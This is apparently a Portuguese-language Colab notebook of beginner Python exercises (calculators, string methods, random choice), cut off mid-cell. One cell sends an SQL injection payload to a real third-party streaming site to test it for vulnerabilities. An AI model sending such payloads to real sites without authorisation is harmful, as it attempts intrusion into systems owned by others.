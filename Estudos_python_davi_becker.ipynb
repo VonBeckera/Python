{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "name": "Estudos_python_davi_becker.ipynb",
      "mount_file_id": "https://gist.github.com/VonBeckera/890cc00392789d5dd836094d4c7fd563#file-untitled1-ipynb",
      "authorship_tag": "ABX9TyPHGNC8orFUxkDb//Fz678j",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/VonBeckera/Python/blob/main/Estudos_python_davi_becker.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "kCjFpoujXt6Q",
        "outputId": "db4f10bc-0c19-4cfb-f0b9-ec61c7ad160a"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite algo:        \n",
            "O tipo digitado é:  <class 'str'>\n",
            "O tipo digitado tem espaços:  True\n",
            "O tipo digitado é um número:  False\n",
            "O tipo digitado é alfa numerico:  False\n",
            "O tipo digitado e alfabetico:  False\n",
            "O tipo está capitalizado:  False\n"
          ]
        }
      ],
      "source": [
        "a = input('Digite algo: ')\n",
        "print('O tipo digitado é: ', type(a))\n",
        "print('O tipo digitado tem espaços: ', a.isspace())\n",
        "print('O tipo digitado é um número: ', a.isnumeric())\n",
        "print('O tipo digitado é alfa numerico: ', a.isalnum())\n",
        "print('O tipo digitado e alfabetico: ', a.isalpha())\n",
        "print('O tipo está capitalizado: ', a.istitle())"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Ordem Aritimetica de precedência\n",
        "#1 - ()\n",
        "#2 - **\n",
        "#3- *,/,//,%\n",
        "#4- +,-"
      ],
      "metadata": {
        "id": "0piO8u4NWs6k"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#Exmplos de precedencias\n",
        "# Exemplo 1\n",
        "n1 = 5\n",
        "n2 = 2\n",
        "n3 = 3\n",
        "s = n1+n2*n3\n",
        "print(s)\n",
        "\n",
        "# Exemplo 2\n",
        "n4 = 3\n",
        "n5 = 5\n",
        "n6 = 4\n",
        "n7 = 2\n",
        "s1 = n4*n5+n6**n7\n",
        "print(s1)\n",
        "# Exemplo 3\n",
        "\n",
        "n8 = 3\n",
        "n9 = 5\n",
        "n0 = 4\n",
        "n11 = 2\n",
        "s2 = n8*(n9+n0)**n11\n",
        "print(s2)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "OTqlNsOIVpOC",
        "outputId": "41be9b42-68e3-4e1a-a071-cf11e40cf384"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "11\n",
            "31\n",
            "243\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Aula 04\n"
      ],
      "metadata": {
        "id": "DdBtVGtyclQk"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Aula 07\n"
      ],
      "metadata": {
        "id": "E_VeYbVjZphx"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "nome = input('Qual o seu nome? ')\n",
        "print(f'Seja Bem Vindo {nome}!')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "hgXzhrxiZufz",
        "outputId": "270cbd7e-6634-4e82-c2fd-3d588d86893d"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Qual o seu nome? pedro\n",
            "Seja Bem Vindo pedro!\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "n1 = int(input('Digite um valor ' ))\n",
        "n2 = int(input('Digite outro valor ' ))\n",
        "print(f'A soma vale {n1+n2}')"
      ],
      "metadata": {
        "id": "S5y-FCZYdcIT",
        "outputId": "1aec9531-aafa-42cf-f998-64285cf1025e",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite um valor 100\n",
            "Digite outro valor 200\n",
            "A soma vale 300\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Conversão de valores em dólar\n",
        "\n",
        "d = float(input('Digite o valor que você tem na carteria: '))\n",
        "c = d/5.07\n",
        "print(f'O valor de {d} Reais equivale a {c:.2f} dólares')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "884aqXEPBNxF",
        "outputId": "47107a8b-40da-413f-c781-55dd23765dff"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite o valor que você tem na carteria: 20\n",
            "O valor de 20.0 Reais equivale a 3.94 dólares\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Calcular desconto de x% do valor de um produto\n",
        "n = input('Digite seu nome para acessar o sistema: ')\n",
        "print(f'Seja bem vido {n} ao sistema de cáculos de descontos')\n",
        "v = float(input('Digite o valor do produto: '))\n",
        "d = float(input('Digite o valor do desconto: '))\n",
        "c = v - (v * d / 100)\n",
        "print(f'O valor final com o Desconto de {d:.0f}% é de R${c:.2f}')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "sqGLri-Plo38",
        "outputId": "960f7c84-2df6-496d-8034-9313c340673f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite seu nome para acessar o sistema: davi\n",
            "Seja bem vido davi ao sistema de cáculos de descontos\n",
            "Digite o valor do produto: 100\n",
            "Digite o valor do desconto: 10\n",
            "O valor final com o Desconto de 10% é de R$90.00\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Calcular a área de uma parede retangular e a quantidade de tinta a ser usada\n",
        "# 1 litro de tinta pinta 2m² de parede\n",
        "# Área - Base(b) x Altura(h)\n",
        "n = input('Digite seu nome ')\n",
        "print(f'Seja Bem vindo {n} ao sistema de cácluo de pintura de área construída')\n",
        "b = float(input('Digite o valor da Base em metros: ' ))\n",
        "h = float(input('Digite o valor da altura em metros: ' ))\n",
        "a = (b*h)\n",
        "t = (a / 2)\n",
        "print(f'A área tem {a} m² e a quantidade de tinta nescessária para pintar é de {t} Litros de tinta')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Mv8zfPK5GTX6",
        "outputId": "57243c53-26af-4e12-b79d-ba479fda051a"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite seu nome davi\n",
            "Seja Bem vindo davi ao sistema de cácluo de pintura de área construída\n",
            "Digite o valor da Base em metros: 5\n",
            "Digite o valor da altura em metros: 5\n",
            "A área tem 25.0 m² e a quantidade de tinta nescessária para pintar é de 12.5 Litros de tinta\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Teste de ocultar senha\n",
        "import getpass\n",
        "s = getpass.getpass(prompt='Digite sua senha ')\n",
        "s2 = \"123\"\n",
        "\n",
        "if s == s2:\n",
        "    print('Seja Bem vindo ao sistema')\n",
        "\n",
        "else:\n",
        "    print('Senha inválida!')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "UeOXKxFfnsfK",
        "outputId": "42caea89-686b-4ad0-874a-1969642991fe"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite sua senha ··········\n",
            "Seja Bem vindo ao sistema\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Ler salário e mostre o novo salário com 15% de aumento\n",
        "n = input('Digite seu nome: ')\n",
        "print(f'Seja bem vindo {n} ao sistema de cálculo de salários')\n",
        "print('Este sistema irá calcular o aumento salarial de 15% sobre o salário informado')\n",
        "s = float(input('Informe o valor do salário: '))\n",
        "c = (s * 0.15)+s\n",
        "p = c-s\n",
        "print(f'O salário de R${s:.2f} com aumento de 15% é de R${c:.2f} o valor do aumento foi de R$: {p:.2f}')\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "-zVgTejoFRdr",
        "outputId": "76278101-3299-40c8-a849-266f5e52ac90"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite seu nome: davi\n",
            "Seja bem vindo davi ao sistema de cálculo de salários\n",
            "Este sistema irá calcular o aumento salarial de 15% sobre o salário informado\n",
            "Informe o valor do salário: 1200\n",
            "O salário de R$1200.00 com aumento de 15% é de R$1380.00 o valor do aumento foi de R$: 180.00\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Sucessor e antecessor de um número digitado\n",
        "n = int(input('Digite um número: '))\n",
        "print(f'O sucessor do número {n} é: {n+1}, é seu antecessor é: {n-1}')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "fbSSh6e3K-XR",
        "outputId": "f36abda9-799f-4d73-f24b-36357f0ceec5"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite um número: 10\n",
            "O sucessor do número 10 é: 11, é seu antecessor é: 9\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Crie um algoritmo que leia um número e mostre o seu dobro, triplo e raiz quadrada.\n",
        "import math\n",
        "n = int(input('Digite um número e vamos calulcar seu dobro, triplo e raiz quadrada: '))\n",
        "d = n*2\n",
        "t = n*3\n",
        "r = math.sqrt(n)\n",
        "l = n**(1/2)\n",
        "print(f'O dobro do número {n} é: {d}\\n ---- O triplo de {n} é: {t}\\n ---- A raiz quadrada de {n} é: {r}')\n",
        "print(l)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "K1nTRN9SMHlx",
        "outputId": "c1b9af4a-1e54-4375-f7fb-bb99d0fd2c8d"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite um número e vamos calulcar seu dobro, triplo e raiz quadrada: 400\n",
            "O dobro do número 400 é: 800\n",
            " ---- O triplo de 400 é: 1200\n",
            " ---- A raiz quadrada de 400 é: 20.0\n",
            "20.0\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Desenvolva um programa que leia as duas notas de um aluno, calcule e mostre a sua média.\n",
        "import getpass\n",
        "n = input('Digite seu nome: ')\n",
        "s2 = \"123\"\n",
        "\n",
        "while True:\n",
        "    s = getpass.getpass(prompt='Digite sua senha: ')\n",
        "    if s == s2:\n",
        "        print(f'Seja bem vindo {n} ao sistema de notas e médias acadêmicas')\n",
        "        break\n",
        "    else:\n",
        "        print('Senha inválida, tente novamente.')\n",
        "\n",
        "while True:\n",
        "    op = int(input('Digite 1 para sair ou 2 para um novo aluno: '))\n",
        "\n",
        "    if op == 1:\n",
        "        print('Obrigado por utilizar nosso sistema, até logo!')\n",
        "        break\n",
        "\n",
        "    elif op == 2:\n",
        "        a = input('Digite o nome do aluno: ')\n",
        "        nota1 = float(input(f'Digite a primeira nota do Aluno {a}: '))\n",
        "        nota2 = float(input(f'Digite a segunda nota do aluno {a}: '))\n",
        "        media = (nota1 + nota2) / 2\n",
        "\n",
        "        if media >= 7:\n",
        "            print(f'O aluno {a} foi aprovado com Média {media}')\n",
        "        else:\n",
        "            print(f'O aluno {a} foi reprovado com média {media}')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "lJlv1MqNPLrr",
        "outputId": "4966fda6-16b7-4a15-fc20-c9e5fc5efd41"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite seu nome: Davi\n",
            "Digite sua senha: ··········\n",
            "Seja bem vindo Davi ao sistema de notas e médias acadêmicas\n",
            "Digite 1 para sair ou 2 para um novo aluno: 2\n",
            "Digite o nome do aluno: Jose\n",
            "Digite a primeira nota do Aluno Jose: 10\n",
            "Digite a segunda nota do aluno Jose: 5\n",
            "O aluno Jose foi aprovado com Média 7.5\n",
            "Digite 1 para sair ou 2 para um novo aluno: 1\n",
            "Obrigado por utilizar nosso sistema, até logo!\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Programa de conversão de metros para CM e MM\n",
        "\n",
        "me = int(input('Digite o valor em metros: '))\n",
        "cm = me*100 \n",
        "mm = me*1000\n",
        "print(f'O valor de {me} metros equivale a: {cm} Centímetros e {mm} Milímetros')\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "EUVG-xbMZeEH",
        "outputId": "eaf73262-4d63-4b1e-fe95-e435a3e38b47"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite o valor em metros: 20\n",
            "O valor de 20 metros equivale a: 2000 Centímetros e 20000 Milímetros\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Tabuada de um número digitado\n",
        "print('Bem vindo a tabuada de um número digitado')\n",
        "n = int(input('Digite um número: '))\n",
        "print(f'{n} x {1} = {n*1}')\n",
        "print(f'{n} x {2} = {n*2}')\n",
        "print(f'{n} x {3} = {n*3}')\n",
        "print(f'{n} x {4} = {n*4}')\n",
        "print(f'{n} x {5} = {n*5}')\n",
        "print(f'{n} x {6} = {n*6}')\n",
        "print(f'{n} x {7} = {n*7}')\n",
        "print(f'{n} x {8} = {n*8}')\n",
        "print(f'{n} x {9} = {n*9}')\n",
        "print(f'{n} x {10} = {n*10}')"
      ],
      "metadata": {
        "id": "ldM09OBobYP2",
        "outputId": "8ee82403-deaa-49ff-9c87-1a5ba0871eb1",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Bem vindo a tabuada de um número digitado\n",
            "Digite um número: 5\n",
            "5 x 1 = 5\n",
            "5 x 2 = 10\n",
            "5 x 3 = 15\n",
            "5 x 4 = 20\n",
            "5 x 5 = 25\n",
            "5 x 6 = 30\n",
            "5 x 7 = 35\n",
            "5 x 8 = 40\n",
            "5 x 9 = 45\n",
            "5 x 10 = 50\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Convertendo temperatura\n",
        "\n",
        "t = float(input('Digite a temperatura em Celsius: '))\n",
        "f1 = (1.8 * t) + 32\n",
        "print(f'Converter {t}°C para a escala Fahrenheit : {f1}°')\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CQNSdQ7HNwQP",
        "outputId": "9f8835c4-666d-4672-fc89-042944fd65f0"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite a temperatura em Celsius: 40\n",
            "Converter 40.0°C para a escala Fahrenheit : 104.0°\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Escreva um programa que pergunte a quantidade de Km percorridos por \n",
        "#um carro alugado e a quantidade de dias pelos quais ele foi alugado.\n",
        "#Calcule o preço a pagar, sabendo que o carro custa R$60 por dia e R$0,15 por Km rodado.\n",
        "\n",
        "print('Seja bem vido ao Locacar')\n",
        "d = 60\n",
        "d2 = int(input('Informe a quantidade de dias de locação: '))\n",
        "km = float(input('Informe a kilometragem final: '))\n",
        "cpkm = km * 0.15\n",
        "cd = d * d2\n",
        "cf = cd+cpkm\n",
        "print(f' O custo das diárias de {d2} dias foram de R${cd:.2f}\\n o custo da kilomêtragem de {km} KM foi de R${cpkm:.2f}\\n o valor final a ser pago pelo aluguel do veículo é de R$ {cf:.2f}')\n",
        "\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "vz_HUvGVsVBH",
        "outputId": "171ce5b3-60c1-4786-e450-b8fc01b66618"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Seja bem vido ao Locacar\n",
            "Informe a quantidade de dias de locação: 30\n",
            "Informe a kilometragem final: 750\n",
            " O custo das diárias de 30 dias foram de R$1800.00\n",
            " o custo da kilomêtragem de 750.0KM foi de R$112.50\n",
            " o valor final a ser pago pelo aluguel do veículo é de R$ 1912.50\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "MÓDULO 2\n"
      ],
      "metadata": {
        "id": "FvUwHZoIxPtJ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install emoji\n",
        "import emoji\n",
        "print(emoji.emojize(\"Olá mundo :sunglasses: \"))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "d14LXRHFxTdq",
        "outputId": "b36fcee7-34e0-42cc-cd87-a89455d1abf9"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Requirement already satisfied: emoji in /usr/local/lib/python3.8/dist-packages (2.2.0)\n",
            "Olá mundo 🕶️ \n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from math import trunc\n",
        "n = float(input('Digite um numero qualquer: '))\n",
        "print(f' A porção inteira do número digitado {n} é: {trunc(n)}')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6AdqIN3f6lA4",
        "outputId": "e3d6860e-94fa-4ed0-a8d5-572eb0d14b46"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite um numero qualquer: 6.99\n",
            " A porção inteira do número digitado 6.99 é: 6\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from math import hypot\n",
        "copo = int(input('Digite o valor do cateto oposto: '))\n",
        "cadj = int(input('Digite o valor do cateto adjacente: '))\n",
        "\n",
        "hip = hypot(copo,cadj)\n",
        "\n",
        "print(f'O valor da Hipotenusa é: {hip}')\n",
        "\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "-6Ddn5aEQRqx",
        "outputId": "73f21c95-0a9e-47c2-88cd-842ecde2da1d"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite o valor do cateto oposto: 4\n",
            "Digite o valor do cateto adjacente: 3\n",
            "O valor da Hipotenusa é: 5.0\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from  math import sin,cos,tan,radians\n",
        "\n",
        "a = int(input('Digite o valor do ângulo: '))\n",
        "\n",
        "r = math.radians(a)\n",
        "cosseno = math.cos(r)\n",
        "seno = math.sin(r)\n",
        "tangente = math.tan(r)\n",
        "\n",
        "print(f'O valor do seno é {sin(r)} do cosseno é {cos(r)} e da tangente é {tan(r)} o ângulo em radianos é de {r}')\n",
        "\n"
      ],
      "metadata": {
        "id": "cSFcUiHwSOSf",
        "outputId": "a2225661-0de1-4b10-857c-d627e215ff30",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite o valor do ângulo: 45\n",
            "O valor do seno é 0.7071067811865475 do cosseno é 0.7071067811865476 e da tangente é 0.9999999999999999 o ângulo em radianos é de 0.7853981633974483\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from random import choice\n",
        "nome = input('Digite o Primeiro nome: ')\n",
        "nome2 = input('Digite o segundo nome: ')\n",
        "nome3 = input('Digite o terceiro nome: ')\n",
        "nome4 = input('Digite o quarto nome: ')\n",
        "lista = [nome, nome2, nome3, nome4]\n",
        "escolhido = choice(lista)\n",
        "print(f'O aluno escolhido é: {escolhido}')"
      ],
      "metadata": {
        "id": "2BUr5iaGV_yf",
        "outputId": "a5f50890-7301-414e-ca6a-0fdafd3ec6af",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite o Primeiro nome: davi\n",
            "Digite o segundo nome: pedro\n",
            "Digite o terceiro nome: raissa\n",
            "Digite o quarto nome: carla\n",
            "O aluno escolhido é: carla\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import random\n",
        "nome = input('Digite o Primeiro nome: ')\n",
        "nome2 = input('Digite o segundo nome: ')\n",
        "nome3 = input('Digite o terceiro nome: ')\n",
        "nome4 = input('Digite o quarto nome: ')\n",
        "lista = [nome, nome2, nome3, nome4]\n",
        "random.shuffle(lista)\n",
        "print(f'A ordem de apresentação será: {lista}')\n",
        "\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qzZ6TG7_QOnv",
        "outputId": "7c97cb19-fefa-42a2-a341-7e03c8222984"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite o Primeiro nome: davi\n",
            "Digite o segundo nome: camila\n",
            "Digite o terceiro nome: pedro\n",
            "Digite o quarto nome: carlos\n",
            "A ordem de apresentação será: ['carlos', 'davi', 'pedro', 'camila']\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import random\n",
        "\n",
        "nomes = []\n",
        "\n",
        "print(\"Digite 4 nomes separados por enter: \")\n",
        "\n",
        "for i in range(4):\n",
        "    nome = input()\n",
        "    nomes.append(nome)\n",
        "\n",
        "aluno = random.choice(nomes)\n",
        "\n",
        "print(f'O nome é: {aluno}')\n",
        "\n"
      ],
      "metadata": {
        "id": "VJp0D2W0XRYD",
        "outputId": "81a31d12-53ba-40f6-c352-63d1d06d086d",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite 4 nomes um de cada vez apertando enter: \n",
            "Digite 4 nomes separados por enter:\n",
            "raissa\n",
            "hanna\n",
            "amanda\n",
            "andreia\n",
            "O nome é: amanda\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import random\n",
        "nomes = ['Davi','Pedro','Raissa','Claudia','Silvia','Amanda','Fabiana']\n",
        "sorteados = random.sample(nomes, 7)\n",
        "for i , nome in enumerate(sorteados):\n",
        "  print(f'{i + 1}º nome sorteado: {nome}')\n"
      ],
      "metadata": {
        "id": "GBfEmtEf-MMu",
        "outputId": "36c4c096-b0aa-4dee-8309-5d2a1e40c9c5",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "1º nome sorteado: Davi\n",
            "2º nome sorteado: Amanda\n",
            "3º nome sorteado: Silvia\n",
            "4º nome sorteado: Fabiana\n",
            "5º nome sorteado: Raissa\n",
            "6º nome sorteado: Claudia\n",
            "7º nome sorteado: Pedro\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install pygame\n",
        "import pygame\n",
        "pygame.init()\n",
        "pygame.mixer.init()\n",
        "pygame.mixer.music.load(\"/content/drive/MyDrive/Contas/teste.mp3\")\n",
        "pygame.mixer.music.play()\n",
        "\n",
        "\n"
      ],
      "metadata": {
        "id": "7vj_wGNWS-Wf",
        "outputId": "7cfc8568-f777-469a-e2c8-e4b4f7ce3823",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 269
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Requirement already satisfied: pygame in /usr/local/lib/python3.8/dist-packages (2.1.2)\n"
          ]
        },
        {
          "output_type": "error",
          "ename": "error",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31merror\u001b[0m                                     Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-20-e9b09a5be1c8>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msystem\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'pip install pygame'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mpygame\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 3\u001b[0;31m \u001b[0mpygame\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mmixer\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0minit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      4\u001b[0m \u001b[0mpygame\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mmixer\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mmusic\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mload\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"/content/drive/MyDrive/Contas/teste.mp3\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0mpygame\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mmixer\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mmusic\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mplay\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31merror\u001b[0m: ALSA: Couldn't open audio device: No such file or directory"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "\n",
        "url = \"https://pobreflix.biz/\"\n",
        "payload = {\"q\": \"' OR (SELECT COUNT(*) FROM all_tables) > 1 --\"}\n",
        "\n",
        "response = requests.get(url, params=payload)\n",
        "\n",
        "if \"error\" not in response.text:\n",
        "    print(\"SQL Injection vulnerability detected!\")\n",
        "else:\n",
        "    print(\"No SQL Injection vulnerability detected.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Gao-uJ7fL20n",
        "outputId": "c36b7aeb-406b-44bd-85c5-17f6cdf8e9ad"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "No SQL Injection vulnerability detected.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "AULA 09 - Manipulando Textos"
      ],
      "metadata": {
        "id": "dsu5naaMJz5p"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#manipulando texto\n",
        "\n",
        "frase = ('CURSO EM VIDEO PYTHON')# variavel frase recebendo valor (\"\")\n",
        "frase2 = ('CURSO EM VIDEO PYTHON')# variavel frase recebendo valor (\"\")\n",
        "\n",
        "nova_frase = frase.replace('VIDEO','XUXA ')#Substituindo uma string da frase por outra metodo replace\n",
        "\n",
        "#palavra_antiga = input(f'Digite a palavra antiga que voce quer substiruir na frase {frase}: ')\n",
        "#palavra_nova = input(f'Digite agora a palavra nova que sera inserida no lugar da palavara digita {palavra_antiga}: ')\n",
        "#frase3 = frase.replace(palavra_antiga, palavra_nova)\n",
        "\n",
        "\n",
        "\n",
        "frase_maiuscula = frase2.upper()#converte tudo para maisculo\n",
        "\n",
        "frase_minuscula = frase.lower()#capitalize(): esse método converte a primeira letra da string para maiúscula e as demais para minúsculas.\n",
        "\n",
        "frase_primeira_letra = frase.capitalize()\n",
        "\n",
        "contador = len(frase) #len () faz a contagem de todas as strings da frase\n",
        "\n",
        "a = frase.count('o') #count() faz a contagem de um determinado numero de vezes que um caracter ou palavra se repete\n",
        "\n",
        "indice = frase.find('em')#étodo de string que retorna o índice da primeira ocorrência de uma sub-string em uma string\n",
        "\n",
        "frasse_Title = frase.title()#title(): esse método converte a primeira letra de cada palavra da string para maiúscula e as demais para minúsculas.\n",
        "\n",
        "dividido = frase.split()\n",
        "\n",
        "#print(frase3)\n",
        "#print(frase[3])\n",
        "#\n",
        "print(frase.find('VIDEO'))\n",
        "print(dividido)\n",
        "print(dividido[3])\n",
        "#print(frasse_Title)\n",
        "#print(frase_primeira_letra)\n",
        "#print(frase_minuscula)\n",
        "#print(frase_maiuscula)\n",
        "#print(nova_frase)\n",
        "#print(indice)#indice da primeira ocorrência de uma sub-string em uma string\n",
        "#print(a)# imprime o numero de ocorrencias de um caracter string ou palavras\n",
        "#print(contador)# imprime o numero total de caracteres de uma string\n",
